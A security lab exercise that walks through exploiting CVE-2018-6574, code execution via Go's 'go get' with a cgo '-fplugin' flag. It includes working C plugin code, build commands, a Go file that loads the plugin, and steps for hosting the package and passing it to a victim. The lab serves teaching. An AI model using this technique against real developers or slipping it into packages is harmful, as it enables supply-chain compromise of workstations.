## Introduction
-->This exercise covers a remote command execution in Golang's go get command.
-->In this exercise, we are going to cover CVE-2018-6574. This vulnerability impacts Golang `go get` command and allows an attacker to gain code execution on a system installing his malicious library. This is a good example of a vulnerability that can be exploited using [typosquatting](https://en.wikipedia.org/wiki/Typosquatting) to gain code execution on developers' workstations and production systems. This vulnerability was fixed in Go 1.8.7, 1.9.4 and 1.10rc2.

## The issue
-->The issue is due to the fact that when installing a package, Golang will build native extensions. This can be used to pass additional flags to the compiler to gain code execution. For example, `CFLAGS` can be used.

## Exploitation
-->Here, we will need to host our malicious package. We need a website with TLS and a valid certificate chain. An easy way to do this is to use [github.com](https://github.com).
-->Then, you will need a malicious plugin/`.so` file. The code below should help you with that:
```
	#include<stdio.h>
	#include<stdlib.h>
	 
	static void malicious() __attribute__((constructor));
	 
	void malicious() {
	    system("touch /tmp/owned");
	}
```
-->You can build it using the following command:
```c
$ gcc -shared -o attack.so -fPIC attack.c
```
-->You will need to build that plugin on the same platform and architecture as the victim: Linux 64bit.
-->Finally, you need the go code that will tell `cgo` to use your plugin:
```
	package main
	// #cgo CFLAGS: -fplugin=./attack.so
	// typedef int (*intFunc) ();
	//
	// int
	// bridge_int_func(intFunc f)
	// {
	//      return f();
	// }
	//
	// int fortytwo()
	// {
	//      return 42;
	// }
	import "C"
	import "fmt"
	 
	func main() {
	    f := C.intFunc(C.fortytwo)
	    fmt.Println(int(C.bridge_int_func(f)))
	    // Output: 42
	}
```
-->Once you host your full payload on Github, you should be able to pass the package link to the victim.
-->Please make sure you remove or make your repository private once you solved this challenge

## Conclusion
-->This exercise showed you how you use exploit CVE-2018-6574 to gain code execution on a vulnerable system. This type of attacks can also be used to escalate your privileges on some system.
